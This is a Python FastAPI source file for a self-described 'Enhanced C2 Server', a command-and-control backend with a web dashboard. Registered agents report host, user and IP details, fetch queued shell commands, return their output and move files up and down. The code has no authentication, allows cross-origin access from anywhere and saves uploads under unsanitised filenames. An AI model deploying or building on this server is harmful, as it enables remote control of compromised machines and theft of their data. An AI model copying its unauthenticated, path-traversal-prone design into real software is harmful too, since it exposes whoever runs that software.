from fastapi import FastAPI, HTTPException, status, UploadFile, File, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Optional
import asyncio
import json
import os
import uuid
import time
import logging
from datetime import datetime
import aiofiles
from pathlib import Path

from config import settings

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize FastAPI app
app = FastAPI(title="Enhanced C2 Server", version="1.0.0")

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# No authentication required

# Create necessary directories
os.makedirs(settings.UPLOAD_DIR, exist_ok=True)
os.makedirs(settings.DOWNLOAD_DIR, exist_ok=True)
os.makedirs("static", exist_ok=True)
os.makedirs("templates", exist_ok=True)

# Mount static files
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# In-memory storage (in production, use a database)
agents: Dict[str, Dict] = {}
commands: Dict[str, List[Dict]] = {}
command_results: Dict[str, List[Dict]] = {}
active_connections: List[WebSocket] = []

# Pydantic models
class AgentRegister(BaseModel):
    agent_id: str
    hostname: str
    username: str
    os_info: str
    ip_address: str
    port: int

class CommandRequest(BaseModel):
    agent_id: str
    command: str
    command_type: str = "shell"

class CommandResult(BaseModel):
    agent_id: str
    command_id: str
    result: str
    success: bool
    timestamp: str

# No authentication models needed

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def send_personal_message(self, message: str, websocket: WebSocket):
        await websocket.send_text(message)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except:
                pass

manager = ConnectionManager()

# Routes
@app.get("/test", response_class=HTMLResponse)
async def test_dashboard():
    with open("tests/test_dashboard.html", "r") as f:
        return HTMLResponse(content=f.read())

@app.get("/", response_class=HTMLResponse)
async def simple_dashboard():
    with open("static/simple_dashboard.html", "r") as f:
        return HTMLResponse(content=f.read())

@app.get("/simple", response_class=HTMLResponse)
async def dashboard():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Enhanced C2 Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
            .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { text-align: center; margin-bottom: 30px; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
            .stat-card { background: #007bff; color: white; padding: 20px; border-radius: 8px; text-align: center; }
            .stat-number { font-size: 2em; font-weight: bold; }
            .section { margin-bottom: 30px; }
            .section h2 { border-bottom: 2px solid #007bff; padding-bottom: 10px; }
            table { width: 100%; border-collapse: collapse; margin-top: 10px; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background-color: #f8f9fa; }
            .btn { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
            .btn:hover { background: #0056b3; }
            .btn-danger { background: #dc3545; }
            .btn-danger:hover { background: #c82333; }
            .command-input { width: 70%; padding: 10px; margin-right: 10px; }
            .log { background: #f8f9fa; padding: 15px; border-radius: 4px; max-height: 300px; overflow-y: auto; font-family: monospace; }
            .command-result { margin-bottom: 15px; border-left: 3px solid #007bff; padding-left: 10px; }
            .command-header { font-weight: bold; color: #007bff; margin-bottom: 5px; }
            .command-output { 
                background: #ffffff; 
                padding: 10px; 
                border-radius: 4px; 
                border: 1px solid #dee2e6; 
                white-space: pre-wrap; 
                font-family: 'Courier New', monospace; 
                font-size: 13px;
                line-height: 1.4;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Enhanced C2 Server Dashboard</h1>
                <p>Command and Control Server Management Interface</p>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number" id="agent-count">0</div>
                    <div>Active Agents</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="command-count">0</div>
                    <div>Commands Executed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="success-rate">0%</div>
                    <div>Success Rate</div>
                </div>
            </div>

            <div class="section">
                <h2>Active Agents</h2>
                <table id="agents-table">
                    <thead>
                        <tr>
                            <th>Agent ID</th>
                            <th>Hostname</th>
                            <th>Username</th>
                            <th>OS</th>
                            <th>IP Address</th>
                            <th>Last Seen</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="agents-tbody">
                    </tbody>
                </table>
            </div>

            <div class="section">
                <h2>Command Execution</h2>
                <div>
                    <select id="agent-select" style="padding: 10px; margin-right: 10px;">
                        <option value="">Select Agent</option>
                    </select>
                    <input type="text" id="command-input" class="command-input" placeholder="Enter command...">
                    <button class="btn" onclick="executeCommand()">Execute</button>
                    <button class="btn" onclick="refreshDashboard()" style="background: #28a745;">Refresh</button>
                </div>
                <div id="command-results" class="log" style="margin-top: 20px;"></div>
            </div>

            <div class="section">
                <h2>System Logs</h2>
                <div id="system-logs" class="log"></div>
            </div>
        </div>

        <script>
            let ws = new WebSocket(`ws://${window.location.host}/ws`);
            
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                updateDashboard(data);
            };

            function updateDashboard(data) {
                if (data.type === 'agent_update') {
                    updateAgentsTable(data.agents);
                    updateStats(data);
                } else if (data.type === 'command_result') {
                    addCommandResult(data.result);
                } else if (data.type === 'log') {
                    addSystemLog(data.message);
                }
            }

            function updateAgentsTable(agents) {
                console.log('Updating agents table with:', agents);
                const tbody = document.getElementById('agents-tbody');
                const select = document.getElementById('agent-select');
                
                if (!tbody || !select) {
                    console.error('Could not find agents table or select element');
                    return;
                }
                
                tbody.innerHTML = '';
                select.innerHTML = '<option value="">Select Agent</option>';
                
                const agentValues = Object.values(agents);
                console.log('Processing', agentValues.length, 'agents');
                
                agentValues.forEach(agent => {
                    console.log('Adding agent:', agent.agent_id);
                    const row = tbody.insertRow();
                    row.innerHTML = `
                        <td>${agent.agent_id}</td>
                        <td>${agent.hostname}</td>
                        <td>${agent.username}</td>
                        <td>${agent.os_info}</td>
                        <td>${agent.ip_address}</td>
                        <td>${new Date(agent.last_seen).toLocaleString()}</td>
                        <td><span style="color: green;">Online</span></td>
                        <td>
                            <button class="btn btn-danger" onclick="removeAgent('${agent.agent_id}')">Remove</button>
                        </td>
                    `;
                    
                    const option = document.createElement('option');
                    option.value = agent.agent_id;
                    option.textContent = agent.agent_id;
                    select.appendChild(option);
                });
                
                console.log('Agents table updated successfully');
            }

            function updateStats(data) {
                document.getElementById('agent-count').textContent = Object.keys(data.agents || {}).length;
                document.getElementById('command-count').textContent = data.command_count || 0;
                document.getElementById('success-rate').textContent = data.success_rate || '0%';
            }

            function executeCommand() {
                const agentId = document.getElementById('agent-select').value;
                const command = document.getElementById('command-input').value;
                
                if (!agentId || !command) {
                    alert('Please select an agent and enter a command');
                    return;
                }
                
                fetch('/api/commands/execute', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        agent_id: agentId,
                        command: command,
                        command_type: 'shell'
                    })
                });
                
                document.getElementById('command-input').value = '';
            }

            function addCommandResult(result) {
                const log = document.getElementById('command-results');
                const timestamp = new Date().toLocaleString();
                
                // Format the result to preserve line breaks and formatting
                const formattedResult = result.result
                    .replace(/\n/g, '<br>')  // Convert newlines to HTML line breaks
                    .replace(/\t/g, '&nbsp;&nbsp;&nbsp;&nbsp;')  // Convert tabs to spaces
                    .replace(/ /g, '&nbsp;');  // Preserve spaces
                
                log.innerHTML += `<div class="command-result">
                    <div class="command-header">[${timestamp}] Agent: ${result.agent_id}</div>
                    <div class="command-output">${formattedResult}</div>
                </div>`;
                log.scrollTop = log.scrollHeight;
            }

            function addSystemLog(message) {
                const log = document.getElementById('system-logs');
                const timestamp = new Date().toLocaleString();
                log.innerHTML += `<div>[${timestamp}] ${message}</div>`;
                log.scrollTop = log.scrollHeight;
            }

            function fetchCommandResults() {
                // Fetch command results for all connected agents
                const agentSelect = document.getElementById('agent-select');
                if (agentSelect.value) {
                    fetch(`/api/commands/${agentSelect.value}/results`)
                        .then(response => response.json())
                        .then(data => {
                            const log = document.getElementById('command-results');
                            const existingResults = log.querySelectorAll('.command-result').length;
                            const newResults = data.results.slice(existingResults);
                            
                            newResults.forEach(result => {
                                addCommandResult(result);
                            });
                        })
                        .catch(error => console.error('Error fetching results:', error));
                }
            }

            // Simple initialization - no complex function needed

            function loadAgents() {
                console.log('Loading agents...');
                fetch('/api/agents')
                    .then(response => {
                        console.log('Agents response status:', response.status);
                        return response.json();
                    })
                    .then(data => {
                        console.log('Agents data:', data);
                        updateAgentsTable(data.agents);
                        updateStats({
                            agents: data.agents,
                            command_count: 0,
                            success_rate: '100%'
                        });
                    })
                    .catch(error => console.error('Error loading agents:', error));
            }

            function loadCommandResults(agentId) {
                fetch(`/api/commands/${agentId}/results`)
                    .then(response => response.json())
                    .then(data => {
                        const log = document.getElementById('command-results');
                        log.innerHTML = ''; // Clear existing results
                        
                        data.results.forEach(result => {
                            addCommandResult(result);
                        });
                    })
                    .catch(error => console.error('Error loading command results:', error));
            }

            // Simple initialization - load data immediately when page loads
            window.addEventListener('load', function() {
                console.log('Dashboard loaded, loading agents...');
                loadAgents();
            });

            // Fetch command results every 2 seconds
            setInterval(fetchCommandResults, 2000);

            function removeAgent(agentId) {
                if (confirm('Are you sure you want to remove this agent?')) {
                    fetch(`/api/agents/${agentId}`, { method: 'DELETE' });
                }
            }

            // Handle agent selection change
            function onAgentChange() {
                const agentSelect = document.getElementById('agent-select');
                if (agentSelect.value) {
                    loadCommandResults(agentSelect.value);
                } else {
                    // Clear results if no agent selected
                    document.getElementById('command-results').innerHTML = '';
                }
            }

            // Add event listener for agent selection change when page loads
            window.addEventListener('load', function() {
                const agentSelect = document.getElementById('agent-select');
                if (agentSelect) {
                    agentSelect.addEventListener('change', onAgentChange);
                }
            });

            // Manual refresh function
            function refreshDashboard() {
                console.log('Refreshing dashboard...');
                
                // Show loading indicator
                const refreshBtn = event.target;
                const originalText = refreshBtn.textContent;
                refreshBtn.textContent = 'Refreshing...';
                refreshBtn.disabled = true;
                
                loadAgents();
                const agentSelect = document.getElementById('agent-select');
                if (agentSelect.value) {
                    loadCommandResults(agentSelect.value);
                }
                
                // Reset button after a short delay
                setTimeout(() => {
                    refreshBtn.textContent = originalText;
                    refreshBtn.disabled = false;
                }, 1000);
            }
        </script>
    </body>
    </html>
    """

# No authentication endpoints needed

# Agent management endpoints
@app.post("/api/agents/register")
async def register_agent(agent: AgentRegister):
    agent_id = agent.agent_id
    agent_data = {
        "agent_id": agent_id,
        "hostname": agent.hostname,
        "username": agent.username,
        "os_info": agent.os_info,
        "ip_address": agent.ip_address,
        "port": agent.port,
        "last_seen": datetime.utcnow().isoformat(),
        "status": "online"
    }
    
    agents[agent_id] = agent_data
    commands[agent_id] = []
    command_results[agent_id] = []
    
    logger.info("Agent {} registered from {}".format(agent_id, agent.ip_address))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "agent_update",
        "agents": agents,
        "command_count": sum(len(cmd_list) for cmd_list in commands.values()),
        "success_rate": "100%"
    }))
    
    return {"message": "Agent registered successfully", "agent_id": agent_id}

@app.get("/api/agents")
async def get_agents():
    return {"agents": agents}

@app.delete("/api/agents/{agent_id}")
async def remove_agent(agent_id: str):
    if agent_id in agents:
        del agents[agent_id]
        if agent_id in commands:
            del commands[agent_id]
        if agent_id in command_results:
            del command_results[agent_id]
        
        logger.info("Agent {} removed".format(agent_id))
        
        # Notify dashboard
        await manager.broadcast(json.dumps({
            "type": "agent_update",
            "agents": agents,
            "command_count": sum(len(cmd_list) for cmd_list in commands.values()),
            "success_rate": "100%"
        }))
        
        return {"message": "Agent removed successfully"}
    else:
        raise HTTPException(status_code=404, detail="Agent not found")

@app.post("/api/agents/{agent_id}/heartbeat")
async def agent_heartbeat(agent_id: str):
    if agent_id in agents:
        agents[agent_id]["last_seen"] = datetime.utcnow().isoformat()
        agents[agent_id]["status"] = "online"
        return {"message": "Heartbeat received"}
    else:
        raise HTTPException(status_code=404, detail="Agent not found")

# Command execution endpoints
@app.post("/api/commands/execute")
async def execute_command(command_req: CommandRequest):
    if command_req.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    command_id = str(uuid.uuid4())
    command_data = {
        "command_id": command_id,
        "agent_id": command_req.agent_id,
        "command": command_req.command,
        "command_type": command_req.command_type,
        "timestamp": datetime.utcnow().isoformat(),
        "status": "pending"
    }
    
    commands[command_req.agent_id].append(command_data)
    
    logger.info("Command {} queued for agent {}: {}".format(command_id, command_req.agent_id, command_req.command))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Command queued for agent {}: {}".format(command_req.agent_id, command_req.command)
    }))
    
    return {"message": "Command queued successfully", "command_id": command_id}

@app.get("/api/commands/{agent_id}")
async def get_commands(agent_id: str):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    return {"commands": commands.get(agent_id, [])}

@app.post("/api/commands/result")
async def submit_command_result(result: CommandResult):
    if result.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    result_data = {
        "command_id": result.command_id,
        "agent_id": result.agent_id,
        "result": result.result,
        "success": result.success,
        "timestamp": result.timestamp
    }
    
    command_results[result.agent_id].append(result_data)
    
    # Update command status
    for cmd in commands[result.agent_id]:
        if cmd["command_id"] == result.command_id:
            cmd["status"] = "completed"
            break
    
    logger.info("Command result received from agent {}: {}".format(result.agent_id, result.success))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "command_result",
        "result": result_data
    }))
    
    return {"message": "Command result received"}

@app.get("/api/commands/{agent_id}/results")
async def get_command_results(agent_id: str):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    return {"results": command_results.get(agent_id, [])}

# File transfer endpoints
@app.post("/api/files/upload")
async def upload_file(file: UploadFile = File(...)):
    file_path = os.path.join(settings.UPLOAD_DIR, file.filename)
    
    async with aiofiles.open(file_path, 'wb') as f:
        content = await file.read()
        await f.write(content)
    
    logger.info("File uploaded: {}".format(file.filename))
    
    return {"message": "File uploaded successfully", "filename": file.filename, "path": file_path}

@app.get("/api/files/download/{filename}")
async def download_file(filename: str):
    file_path = os.path.join(settings.DOWNLOAD_DIR, filename)
    
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    
    return FileResponse(file_path, filename=filename)

@app.get("/api/files/list")
async def list_files():
    upload_files = []
    download_files = []
    
    for file in os.listdir(settings.UPLOAD_DIR):
        file_path = os.path.join(settings.UPLOAD_DIR, file)
        if os.path.isfile(file_path):
            upload_files.append({
                "filename": file,
                "size": os.path.getsize(file_path),
                "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
            })
    
    for file in os.listdir(settings.DOWNLOAD_DIR):
        file_path = os.path.join(settings.DOWNLOAD_DIR, file)
        if os.path.isfile(file_path):
            download_files.append({
                "filename": file,
                "size": os.path.getsize(file_path),
                "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
            })
    
    return {"upload_files": upload_files, "download_files": download_files}

# WebSocket endpoint for real-time updates
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # Echo back the message (for testing)
            await manager.send_personal_message("Echo: {}".format(data), websocket)
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# Health check endpoint
@app.get("/api/health")
async def health_check():
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "agents_count": len(agents),
        "commands_count": sum(len(cmd_list) for cmd_list in commands.values())
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host=settings.SERVER_HOST, port=settings.SERVER_PORT)
